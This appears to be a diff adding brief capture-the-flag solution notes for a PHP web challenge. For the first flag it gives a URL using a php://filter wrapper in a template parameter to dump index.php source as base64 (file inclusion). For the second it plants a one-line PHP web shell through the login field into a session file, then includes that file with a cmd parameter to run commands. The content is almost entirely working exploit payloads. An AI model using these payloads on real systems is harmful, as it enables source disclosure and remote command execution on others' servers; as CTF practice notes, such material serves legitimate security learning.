@@ -1,0 +1,6 @@
+FLAG1:
+	url: https://copygen.splitline.tw/?tpl=php://filter/convert.base64-encode/resource=index.php
+	Decode from Base64 format
+FLAG2:
+	login: <?php system($_GET["cmd"]); ?>
+	sh: https://copygen.splitline.tw/?tpl=/tmp/sess_{Value}&cmd={command}
